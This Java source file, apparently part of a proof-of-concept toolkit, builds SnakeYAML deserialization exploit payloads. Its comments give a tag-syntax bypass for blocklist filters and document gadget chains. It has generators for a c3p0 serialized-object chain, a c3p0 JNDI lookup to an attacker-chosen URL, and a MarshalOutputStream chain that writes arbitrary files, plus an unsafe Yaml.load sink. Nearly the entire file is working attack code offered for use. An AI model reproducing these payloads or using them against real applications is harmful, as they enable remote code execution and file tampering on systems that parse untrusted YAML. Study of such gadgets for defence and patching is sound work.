package dev.silente.javashark.poc;

import org.yaml.snakeyaml.Yaml;

/**
 * Bypass:
 * 1. !!javax.script.ScriptEngineManager -> !<tag:yaml.org,2002:javax.script.ScriptEngineManager>
 */
public class SnakeYamlWays {
    public static void load(String poc) {
        Yaml yaml = new Yaml();
        yaml.load(poc);
    }

    /**
     * Dependencies: com.mchange:c3p0:0.9.5.2
     *
     * com.mchange.v2.c3p0.impl.WrapperConnectionPoolDataSourceBase <setter>
     *  -> VetoableChangeSupport#fireVetoableChange
     *      -> WrapperConnectionPoolDataSource$1#vetoableChange
     *        -> C3P0ImplUtils#parseUserOverridesAsString
     *          -> [static] SerializableUtils#deserializeFromByteArray
     *            -> readObject
     */
    public static String C3P0PoolDataSource(String hexStr) {
        return String.format(
                "!<tag:yaml.org,2002:com.mchange.v2.c3p0.WrapperConnectionPoolDataSource>\n" +
                "  userOverridesAsString: 'HexAsciiSerializedMap:%s;'"
                , hexStr);
    }

    /**
     * Dependencies: com.mchange:c3p0:0.9.5.2
     *
     */
    public String C3P0JNDIRefForwardingDataSource(String url) {
        return String.format(
                "!!com.mchange.v2.c3p0.JndiRefForwardingDataSource\n" +
                "  jndiName: \"%s\"\n" +
                "  loginTimeout: 0", url);
    }

    /**
     * Dependencies: null
     *
     * MarshalOutputStream <init>
     *   -> ObjectOutputStream <init>
     *     -> ObjectOutputStream#setBlockDataMode
     *       -> ObjectOutputStream#drain
     *         -> write
     */
    public String WriteFile(String path, String b64Content) {
        return String.format(
                "!!sun.rmi.server.MarshalOutputStream [\n" +
                "  !!java.util.zip.InflaterOutputStream [\n" +
                "    !!java.io.FileOutputStream [\n" +
                "      !!java.io.File [\"%s\"],\n" +
                "      false," +
                "    ],\n" +
                "    !!java.util.zip.Inflater { input: !!binary %s },\n" +
                "    114514\n" +
                "  ]\n" +
                "]"
                , path, b64Content);
    }

}
